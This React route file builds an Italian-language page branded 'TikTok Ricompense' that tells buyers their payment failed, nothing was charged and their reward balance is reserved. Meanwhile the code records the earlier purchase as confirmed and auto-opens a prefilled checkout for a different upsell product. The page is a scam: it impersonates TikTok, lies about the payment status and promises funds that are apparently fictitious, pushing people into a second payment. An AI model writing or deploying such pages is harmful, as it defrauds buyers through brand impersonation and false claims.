import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import { DEFAULT_PRODUCT_ID, UP1_PRODUCT_ID } from "@/lib/checkout-config";
import { useTikTokPurchase } from "@/lib/purchase-tracking";
import { ensureDeliverable } from "@/lib/deliverable.functions";
import { SESSION_STORAGE_KEY } from "@/routes/entregavel";
import { CooudCheckout } from "@/components/CooudCheckout";
import { getStoredBuyerEmail } from "@/lib/buyer-email";

declare global {
  interface Window {
    VendepayUpsellWidget?: {
      showIframe: (containerId: string) => void;
    };
  }
}



export const Route = createFileRoute("/up1")({
  head: () => ({
    meta: [
      { title: "Pagamento non completato | TikTok Ricompense" },
      {
        name: "description",
        content:
          "Il tuo pagamento non è andato a buon fine. Il tuo saldo resta riservato: riprova per completare il prelievo.",
      },
      { property: "og:title", content: "Pagamento non completato | TikTok Ricompense" },
      {
        property: "og:description",
        content: "Il tuo saldo resta riservato. Completa ora per garantire lo sblocco.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: Up1Page,
});

function Up1Page() {
  const upsellContainerRef = useRef<HTMLDivElement>(null);
  const [showCheckout, setShowCheckout] = useState(false);
  const [buyerEmail, setBuyerEmail] = useState("");

  // Assim que a pessoa chega do front, puxa o e-mail salvo e abre
  // automaticamente o checkout da Cooud (mesma API do front).
  useEffect(() => {
    setBuyerEmail(getStoredBuyerEmail());
    setShowCheckout(true);
  }, []);

  useTikTokPurchase({ productId: DEFAULT_PRODUCT_ID });

  // Registra l'acquisto del front (P1) non appena il pagamento è confermato,
  // ancorando la data/ora reale usata nel monitoraggio del prodotto.
  const ensure = useServerFn(ensureDeliverable);
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const sessionId = params.get("checkout_session_id") ?? params.get("session_id");
    if (!sessionId || window.localStorage.getItem(SESSION_STORAGE_KEY)) return;
    window.localStorage.setItem(SESSION_STORAGE_KEY, sessionId);
    void ensure({ data: { sessionId } }).catch(() => undefined);
  }, [ensure]);

  // Carica il widget di upsell di Vendepay nella thank-you page.
  useEffect(() => {
    if (typeof window === "undefined" || !upsellContainerRef.current) return;

    const existing = document.getElementById("vendepay-upsell-widget-script");
    if (existing) return;

    const script = document.createElement("script");
    script.id = "vendepay-upsell-widget-script";
    script.src =
      "https://widget.vendepay.com/upsell-widget/v1/vendepay-upsell-widget-1.0.16.js?upsellId=ac1814ec-0ef7-4cf4-8844-46b2cee5efd6";
    script.async = true;
    script.onload = () => {
      if (
        window.VendepayUpsellWidget &&
        typeof window.VendepayUpsellWidget.showIframe === "function"
      ) {
        window.VendepayUpsellWidget.showIframe("vendepay-upsell-container");
      }
    };

    document.body.appendChild(script);

    return () => {
      // Non rimuove lo script per evitare ricaricamenti inutili.
    };
  }, []);

  const handleRetry = () => {
    // Puxa automaticamente o e-mail informado no front e abre o checkout embutido.
    setBuyerEmail(getStoredBuyerEmail());
    setShowCheckout(true);
  };

  return (
    <main className="min-h-screen w-full bg-gradient-to-b from-[#fdeef2] to-[#fbdde4] px-4 py-10 flex flex-col items-center">
      {/* Brand */}
      <div className="flex items-center gap-2 mb-8">
        <svg viewBox="0 0 32 32" fill="currentColor" className="h-7 w-7 text-neutral-900">
          <path d="M22.5 6.3c-1.4-1-2.2-2.5-2.4-4.1h-3.9v16.9c0 1.9-1.6 3.5-3.5 3.5s-3.5-1.6-3.5-3.5 1.6-3.5 3.5-3.5c.4 0 .7.1 1 .2v-4c-.3 0-.7-.1-1-.1-4.1 0-7.4 3.3-7.4 7.4s3.3 7.4 7.4 7.4 7.4-3.3 7.4-7.4v-8.6c1.5 1.1 3.4 1.7 5.4 1.7v-3.9c-1 0-2-.3-2.9-.9z" />
        </svg>
        <span className="text-2xl font-extrabold tracking-tight text-neutral-900">TikTok</span>
      </div>

      <section className="w-full max-w-[480px] rounded-2xl bg-white shadow-[0_20px_50px_-20px_rgba(0,0,0,0.15)] px-6 sm:px-8 py-8 text-center">
        {/* X circle */}
        <div className="mx-auto mb-5 grid h-16 w-16 place-items-center rounded-full bg-rose-100">
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth={2.5}
            strokeLinecap="round"
            strokeLinejoin="round"
            className="h-7 w-7 text-rose-500"
          >
            <line x1="18" y1="6" x2="6" y2="18" />
            <line x1="6" y1="6" x2="18" y2="18" />
          </svg>
        </div>

        {/* Badge */}
        <span className="inline-flex items-center gap-2 rounded-full bg-amber-100/80 px-4 py-1.5 text-[11px] font-bold uppercase tracking-wide text-amber-800">
          <span className="text-[8px] text-amber-500">●</span>
          Quasi fatto · 1 solo passaggio
        </span>

        <h1 className="mt-4 text-[28px] leading-tight font-extrabold text-neutral-900">
          Il tuo pagamento non è andato a buon fine
        </h1>
        <p className="mt-3 text-sm text-neutral-500">
          Instabilità temporanea o sessione scaduta. Nessun importo è stato addebitato sulla tua carta.
        </p>

        {/* Retry note */}
        <div className="mt-6 rounded-xl border border-rose-200 bg-rose-50/60 px-4 py-3.5 text-sm font-bold text-rose-600">
          Riprova per completare il tuo prelievo.
        </div>

        {/* Reserved */}
        <div className="mt-4 rounded-xl border border-dashed border-rose-300 bg-white px-4 py-4 text-left">
          <div className="flex items-center gap-2 text-[11px] font-bold uppercase tracking-wide text-rose-600">
            <svg
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth={2}
              strokeLinecap="round"
              strokeLinejoin="round"
              className="h-3.5 w-3.5"
            >
              <circle cx="12" cy="12" r="9" />
              <path d="M12 7v5l3 2" />
            </svg>
            Il tuo saldo resta riservato
          </div>
          <p className="mt-2 text-sm text-neutral-700">
            Completa ora per garantire lo sblocco e ricevere i tuoi fondi entro 15 minuti.
          </p>
        </div>

        {/* CTA */}
        {!showCheckout && (
          <button
            type="button"
            onClick={handleRetry}
            className="mt-5 flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-rose-500 to-rose-600 px-6 py-4 text-base font-bold text-white shadow-lg shadow-rose-500/30 transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99]"
          >
            Riprova
            <svg
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth={2.5}
              strokeLinecap="round"
              strokeLinejoin="round"
              className="h-4 w-4"
            >
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="12 5 19 12 12 19" />
            </svg>
          </button>
        )}

        {/* Checkout Cooud embutido (mesma API do front) */}
        {showCheckout && (
          <CooudCheckout
            productId={UP1_PRODUCT_ID}
            initialEmail={buyerEmail || undefined}
            autoStart={Boolean(buyerEmail)}
            returnPath="/obrigado"
            className="mt-5 !p-0 !shadow-none"
          />
        )}

        <a
          href="/entregavel"
          className="mt-4 block text-center text-[12px] font-bold uppercase tracking-wide text-neutral-400 underline underline-offset-4"
        >
          Segui lo stato del mio accesso
        </a>

        {/* Vendepay Upsell Widget */}
        <div
          id="vendepay-upsell-container"
          ref={upsellContainerRef}
          className="w-full mt-6"
        />

        <div className="mt-6 border-t border-dashed border-neutral-200" />

        <div className="mt-4 flex items-center justify-center gap-2 text-[11px] font-bold uppercase tracking-wide text-neutral-400">
          <svg
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth={2}
            strokeLinecap="round"
            strokeLinejoin="round"
            className="h-3.5 w-3.5"
          >
            <rect x="5" y="11" width="14" height="10" rx="2" />
            <path d="M8 11V7a4 4 0 0 1 8 0v4" />
          </svg>
          Ambiente 100% sicuro · Crittografia di livello bancario
        </div>
      </section>
    </main>
  );
}
